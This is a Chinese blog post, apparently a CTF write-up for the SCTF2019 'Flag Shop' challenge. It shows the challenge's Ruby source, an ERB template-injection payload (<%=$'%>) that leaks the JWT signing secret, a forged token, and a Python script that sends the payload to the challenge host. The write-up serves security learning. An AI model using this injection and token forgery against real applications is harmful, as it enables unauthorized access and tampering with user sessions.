@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="baidu-site-verification" content="FBx6u1uWmY">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('https://chenzidu.github.io').hostname,
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.5.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":false,"style":"default"},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    sidebarPadding: 40
+  };
+</script>
+  <meta name="description" content="第一次遇见Ruby我去，以为是思路题~">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[SCTF2019]Flag Shop">
+<meta property="og:url" content="https://chenzidu.github.io/2020/03/03/SCTF2019-Flag-Shop/index.html">
+<meta property="og:site_name" content="Chen&#39;Blog">
+<meta property="og:description" content="第一次遇见Ruby我去，以为是思路题~">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://chenzidu.github.io/2020/03/03/SCTF2019-Flag-Shop/1.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/2020/03/03/SCTF2019-Flag-Shop/2.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/2020/03/03/SCTF2019-Flag-Shop/3.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/2020/03/03/SCTF2019-Flag-Shop/4.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/2020/03/03/SCTF2019-Flag-Shop/5.jpg">
+<meta property="article:published_time" content="2020-03-03T08:14:22.000Z">
+<meta property="article:modified_time" content="2022-12-11T09:31:21.954Z">
+<meta property="article:author" content="ChenZIDu">
+<meta property="article:tag" content="WEB">
+<meta property="article:tag" content="jwt">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://chenzidu.github.io/2020/03/03/SCTF2019-Flag-Shop/1.jpg">
+
+<link rel="canonical" href="https://chenzidu.github.io/2020/03/03/SCTF2019-Flag-Shop/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>[SCTF2019]Flag Shop | Chen'Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Chen'Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Chen'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">Life has its own fate, and meeting may not be accidental.</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://chenzidu.github.io/2020/03/03/SCTF2019-Flag-Shop/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="ChenZIDu">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chen'Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [SCTF2019]Flag Shop
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-03-03 16:14:22" itemprop="dateCreated datePublished" datetime="2020-03-03T16:14:22+08:00">2020-03-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-12-11 17:31:21" itemprop="dateModified" datetime="2022-12-11T17:31:21+08:00">2022-12-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+<span class="post-time">
+	   &nbsp; | &nbsp;
+           <span class="post-meta-item-icon">
+             <i class="fa fa-calendar-o"></i>
+           </span>
+           <span class="post-meta-item-text">字数统计:</span>
+           <span class="post-count">654(字)</span>
+           
+         </span>
+	  
+      <span class="post-time">
+	   &nbsp; | &nbsp;
+           <span class="post-meta-item-icon">
+             <i class="fa fa-calendar-o"></i>
+           </span>
+           <span class="post-meta-item-text">阅读时长:</span>
+           <span class="post-count">3(分)</span>
+           
+        </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/03/03/SCTF2019-Flag-Shop/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/03/03/SCTF2019-Flag-Shop/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>第一次遇见Ruby我去，以为是思路题<del>~</del></p>
+<a id="more"></a>
+<p>首先页面是一个shop类的题</p>
+<p><img src="1.jpg" alt="BUU"></p>
+<p>buy flag是购买flag,但是要求你的钱要到1e+27才行，work可以加钱，reset重置。审查页面元素没什么思路，发现robots.txt。</p>
+<p>提示了<code>/filebak</code></p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'sinatra'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'sinatra/cookies'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'sinatra/json'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'jwt'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'securerandom'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'erb'</span></span><br><span class="line"></span><br><span class="line">set <span class="symbol">:public_folder</span>, File.dirname(__FILE__) + <span class="string">'/static'</span></span><br><span class="line"></span><br><span class="line">FLAGPRICE = <span class="number">1000000000000000000000000000</span></span><br><span class="line">ENV[<span class="string">"SECRET"</span>] = SecureRandom.hex(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">configure <span class="keyword">do</span></span><br><span class="line">  enable <span class="symbol">:logging</span></span><br><span class="line">  file = File.new(File.dirname(__FILE__) + <span class="string">'/../log/http.log'</span>,<span class="string">"a+"</span>)</span><br><span class="line">  file.sync = <span class="keyword">true</span></span><br><span class="line">  <span class="keyword">use</span> Rack::CommonLogger, file</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/"</span> <span class="keyword">do</span></span><br><span class="line">  redirect <span class="string">'/shop'</span>, <span class="number">302</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/filebak"</span> <span class="keyword">do</span></span><br><span class="line">  content_type <span class="symbol">:text</span></span><br><span class="line">  erb IO.binread __FILE__</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/api/auth"</span> <span class="keyword">do</span></span><br><span class="line">  payload = &#123; <span class="symbol">uid:</span> SecureRandom.uuid , <span class="symbol">jkl:</span> <span class="number">20</span>&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">  cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/api/info"</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="keyword">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</span><br><span class="line">  json(&#123;<span class="symbol">uid:</span> auth[0][<span class="string">"uid"</span>],<span class="symbol">jkl:</span> auth[0][<span class="string">"jkl"</span>]&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/shop"</span> <span class="keyword">do</span></span><br><span class="line">  erb <span class="symbol">:shop</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/work"</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="keyword">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</span><br><span class="line">  auth = auth[0]</span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="keyword">nil</span>?</span><br><span class="line">    if ENV[<span class="string">"SECRET"</span>].match(<span class="string">"<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>"</span>)</span><br><span class="line">      puts ENV[<span class="string">"FLAG"</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  if params[<span class="symbol">:do</span>] == <span class="string">"<span class="subst">#&#123;params[<span class="symbol">:name</span>][0,<span class="number">7</span>]&#125;</span> is working"</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    auth[<span class="string">"jkl"</span>] = auth[<span class="string">"jkl"</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    ERB::new(<span class="string">"&lt;script&gt;alert('<span class="subst">#&#123;params[<span class="symbol">:name</span>][0,<span class="number">7</span>]&#125;</span> working successfully!')&lt;/script&gt;"</span>).result</span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">"/shop"</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="keyword">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</span><br><span class="line"></span><br><span class="line">  if auth[0][<span class="string">"jkl"</span>] &lt; FLAGPRICE <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">"error"</span>,<span class="symbol">message:</span> <span class="string">"no enough jkl"</span>&#125;)</span><br><span class="line">  else</span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;<span class="symbol">flag:</span> ENV[<span class="string">"FLAG"</span>]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">"success"</span>,<span class="symbol">message:</span> <span class="string">"jkl is good thing"</span>&#125;)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">islogin</span></span></span><br><span class="line">  if cookies[<span class="symbol">:auth</span>].<span class="keyword">nil</span>? <span class="keyword">then</span></span><br><span class="line">    redirect to(<span class="string">'/shop'</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<p><a href="https://www.anquanke.com/post/id/86867" target="_blank" rel="noopener">Ruby ERB模板注入</a>可以稍微学习下。</p>
+<p>本来没什么思路的看大佬blog,Cookie是JWT的，之前做项目本来要用的，后来偷懒没用。。</p>
+<p>发现：</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  if params[<span class="string">:do</span>] == "#&#123;params[<span class="string">:name</span>][<span class="symbol">0,7</span>]&#125; is working" then</span><br><span class="line"></span><br><span class="line"><span class="code">    auth["jkl"] = auth["jkl"].to_i + SecureRandom.random_number(10)</span></span><br><span class="line"><span class="code">    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'</span></span><br><span class="line"><span class="code">    cookies[:auth] = auth</span></span><br><span class="line"><span class="code">    ERB::new("&lt;script&gt;alert('#&#123;params[:name][0,7]&#125; working successfully!')&lt;/script&gt;").result</span></span><br><span class="line"></span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+<p>这一段存在注入，如果传入的do参数和name参数一致，会输出<code>{params[:name][0,7]} working successfully!</code>，ruby里有<a href="https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html" target="_blank" rel="noopener">预定义变量</a></p>
+<p><code>$&#39;-最后一次成功匹配右边的字符串。</code></p>
+<p>构造<code>do=&lt;%=$&#39;%&gt; is working</code>和<code>name=&lt;%=$&#39;%&gt;</code>,记得把里面内容转成十六进制</p>
+<p><img src="2.jpg" alt="Brup"></p>
+<p>拿到secret</p>
+<p><img src="3.jpg" alt="JWT.io"></p>
+<p>将jkl改成1e+27,反正凑成能买flag的钱就行。然后换上去购买。</p>
+<p><img src="4.jpg" alt="brup"></p>
+<p><img src="5.jpg" alt="JWT.io"></p>
+<p>我自己脚本写错了，我学长帮我写了个</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">hea=<span class="string">"auth=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiJkYTQxMTQwNy1mOTU4LTRmOTktOWU0Mi1iZTVlZmRhNTc2ZjIiLCJqa2wiOjIwfQ.YPg24ZW9BpT18ozBDCFjNDg0rirbCRT6USl3zzguZA8"</span></span><br><span class="line"><span class="keyword">while</span>(i&lt;=<span class="number">1000000000000000000000000001</span>):</span><br><span class="line">    url = <span class="string">"http://9d28a02d-1d7b-412c-9fe8-cb414a4ff97a.node3.buuoj.cn/work?name=%3c%25%3d%24%27%25%3e&amp;do=%3c%25%3d%24%27%25%3e%20is%20working&amp;SECRET="</span></span><br><span class="line">    sess = requests.session()</span><br><span class="line">    sess.headers[<span class="string">'Cookie'</span>]=hea</span><br><span class="line">    res = sess.get(url)</span><br><span class="line">    hea=res.headers[<span class="string">'set-cookie'</span>]</span><br><span class="line">    <span class="keyword">print</span>(res.text)</span><br><span class="line">    sess.headers[<span class="string">'Cookie'</span>] = hea</span><br><span class="line">    url1=<span class="string">"http://9d28a02d-1d7b-412c-9fe8-cb414a4ff97a.node3.buuoj.cn/api/info"</span></span><br><span class="line">    re=sess.get(url1)</span><br><span class="line">    a1=re.text.<span class="keyword">split</span>(<span class="string">':'</span>)[<span class="number">2</span>][:-<span class="number">1</span>]</span><br><span class="line">    i=<span class="keyword">int</span>(a1)</span><br><span class="line">    <span class="keyword">print</span>(a1)</span><br><span class="line">    <span class="keyword">print</span>(hea)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>参考<br><a href="http://www.l-team.org/archives/375.html" target="_blank" rel="noopener">L</a><br><a href="https://www.jianshu.com/p/c1c9b6d1e826" target="_blank" rel="noopener">XD_whYe</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/WEB/" rel="tag"># WEB</a>
+              <a href="/tags/jwt/" rel="tag"># jwt</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/03/01/HDU6345-%E5%AD%90%E4%B8%B2%E6%9F%A5%E8%AF%A2-%E5%89%8D%E7%BC%80%E5%92%8C/" rel="prev" title="HDU6345-子串查询(前缀和)">
+      <i class="fa fa-chevron-left"></i> HDU6345-子串查询(前缀和)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/03/05/N%E7%9A%87%E5%90%8E%E9%97%AE%E9%A2%98-DFS/" rel="next" title="N皇后问题-经典DFS">
+      N皇后问题-经典DFS <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="comments"></div>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ChenZIDu"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">ChenZIDu</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">90</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">58</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/chenzidu" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;chenzidu" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:oinsm@outlook.com" title="E-Mail → mailto:oinsm@outlook.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/ChenZIDu1" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;ChenZIDu1" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.loongten.com/" title="https:&#x2F;&#x2F;www.loongten.com&#x2F;" rel="noopener" target="_blank">Keac's</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://hsnico.github.io/" title="https:&#x2F;&#x2F;hsnico.github.io" rel="noopener" target="_blank">Hsnico'blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.suk1.top/" title="https:&#x2F;&#x2F;www.suk1.top&#x2F;" rel="noopener" target="_blank">晓黑</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.dreams-wj.top/" title="https:&#x2F;&#x2F;blog.dreams-wj.top" rel="noopener" target="_blank">HKer_YM</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ncsec.cn/" title="https:&#x2F;&#x2F;blog.ncsec.cn&#x2F;" rel="noopener" target="_blank">RoarNya</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ChenZIDu</span>
+</div>
+  <div class="powered-by">Oinsm
+    
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Web – <a href="https://github.com/ChenZIDu" rel="noopener" target="_blank">🙂</a>
+    
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
